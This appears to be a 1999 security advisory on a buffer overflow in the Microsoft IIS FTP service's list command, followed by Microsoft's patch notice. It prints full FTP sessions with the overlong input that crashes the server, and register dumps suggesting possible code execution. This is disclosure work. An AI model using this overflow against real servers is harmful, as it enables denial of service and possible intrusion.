Advisory:<br>
IIS Remote FTP Exploit/DoS Attack<br>
Systems Tested:<br>
Windows NT 4.0 (SP4) IIS 3.0 / 4.0<br>
Windows 95/98 PWS 1.0<br>
Release Date:<br>
Sunday, January 24, 1999<br>
Advisory Code:<br>
IISE01<br>

Description:<br>
________________________________________________________________________<br>
While feeding in logic into Retina's artificial intelligence engine, which helps construct
query strings to pass to internet servers, checking for overflow bugs and miss parsing of
command strings. Our test server stopped responding. Below is our findings. Microsoft IIS
(Internet Information Server) FTP service contains a buffer overflow in the NLST command.
This could be used to DoS a remote machine and in some cases execute code remotely. </font></p>
<font size="3">

</font><p><font size="3">Lets look at the following example attack. [Comments are in brackets.] The server must
either have anonymous access rights or an attacker must have an account.</font></p>
<font size="3">

<p>C:\&gt;ftp guilt.xyz.com<br>
Connected to guilt.xyz.com.<br>
220 GUILT Microsoft FTP Service (Version 4.0).<br>
User (marc.xyz.com:(none)): ftp<br>
331 Anonymous access allowed, send identity (e-mail name) as password.<br>
Password:<br>
230 Anonymous user logged in.<br>
ftp&gt; ls AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
200 PORT command successful.<br>
150 Opening ASCII mode data connection for file list.<br>
[The server has now processed our long NLST request and has crashed]<br>
-&gt; ftp: get :Connection reset by peer<br>
[Our ftp client looses connection... that is a given]</p>
</font>

<p><font size="3">The above example uses 316 characters to overflow. This is the smallest
possible buffer to pass that will overflow IIS. Lets take a look at the server side
happenings. On the server side we have an "Application Error" message for
inetinfo.exe. "The instruction at '0x710f8aa2' referenced memory at '0x41414156'. The
memory could not be 'read'."</font></p>
<font size="3">

</font><p><font size="3">If we take a look at our registers we will see the following:<br>
EAX = 0000005C EBX = 00000001<br>
ECX = 00D3F978 EDX = 002582DD<br>
ESI = 00D3F978 EDI = 00000000<br>
EIP = 710F8AA2 ESP = 00D3F644<br>
EBP = 00D3F9F0 EFL = 00000206</font></p>

<p><font size="3">There is no 41 hex (Our overflow character) in any of our registers so we chalk this up
as a DoS attack for now. Lets move on and take a look at the largest string we can pass to
overflow IIS.</font></p>
<font size="3">

</font><p><font size="3">C:\&gt;ftp guilt.xyz.com<br>
Connected to guilt.xyz.com.<br>
220 GUILT Microsoft FTP Service (Version 4.0).<br>
User (marc.xyz.com:(none)): ftp<br>
331 Anonymous access allowed, send identity (e-mail name) as password.<br>
Password:<br>
230 Anonymous user logged in.<br>
[The server must either have anonymous access rights or an attacker must have an account]<br>
ftp&gt; ls AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
AAAAAAAAA<br>
200 PORT command successful.<br>
150 Opening ASCII mode data connection for file list.<br>
Connection closed by remote host.</font></p>

<p><font size="3">In this case we passed 505 characters to overflow IIS. This is the largest possible
(tested) buffer to pass that will overflow IIS. Lets take a look once again at the server
side. On the server we have the same "Application Error" message for
inetinfo.exe except this time "The instruction at '0x722c9262' referenced memory at
"0x41414141'." This is looking mighty interesting.</font></p>
<font size="3">

</font><p><font size="3">Lets look at our registers once again:<br>
EAX = 00000000 EBX = 41414141<br>
ECX = 41414141 EDX = 722C1CAC<br>
ESI = 41414141 EDI = 41414141<br>
EIP = 722C9262 ESP = 00D3F524<br>
EBP = 00D3F63C EFL = 00000246</font></p>

<p><font size="3">There sure are a lot of 41 hex codes in our registers now. &gt;:-]</font></p>

<p><font size="3">So to wrap it all up what we have here is a DoS attack against any IIS server with ftp
access. Keep in mind we have to be able to login. However, Anonymous access is granted on
most servers. Once we have overflowed IIS all IIS services will fail. (I.E. The web
service, NNTP, SMTP etc..) What we have seems to be a very interesting buffer overflow.<br>

Patch Available for IIS "Malformed FTP List Request" Vulnerability Originally
Posted: February 3, 1999 Summary <br>
=======<br>
Microsoft has released a patch that eliminates a vulnerability in the Internet Information
Server (r) FTP service. This vulnerability could allow denial of service attacks against
the server or, under certain conditions, could allow arbitrary code to be executed on the
server. A fully supported fix for this problem is available. As detailed below in What
Customers Should Do, Microsoft recommends that customers who are at risk from this
vulnerability apply the patch.</font></p>
<font size="3">

</font><p><font size="3">Issue<br>
=====<br>
The FTP service in IIS has an unchecked buffer in a component that processes
"list" commands. This results in a vulnerability that poses two threats to safe
operation. The first is a denial of service threat; a malformed "list" request
could overflow the buffer causing the server to crash. The second is more esoteric and
would be far more difficult to exploit. A carefully-constructed "list" request
could cause arbitrary code to execute on the server via a classic buffer overrun
technique. Neither variant could be exploited accidentally. </font></p>
<font size="3">

</font><p><font size="3">It is noteworthy that the "list" command is only available to users after
they have authenticated to the server. As a result, only users who are authorized to use
the server would be able to mount such an attack, and their presence on the server could
be logged if the owner of the site chose to do so. However, many sites provide guest
accounts, and this could allow a malicious user to attack the server anonymously.</font></p>
<font size="3">

</font><p><font size="3">Microsoft has no reports of any customers being affected by this vulnerability.
However, Microsoft is proactively releasing a patch that corrects the problem.</font></p>
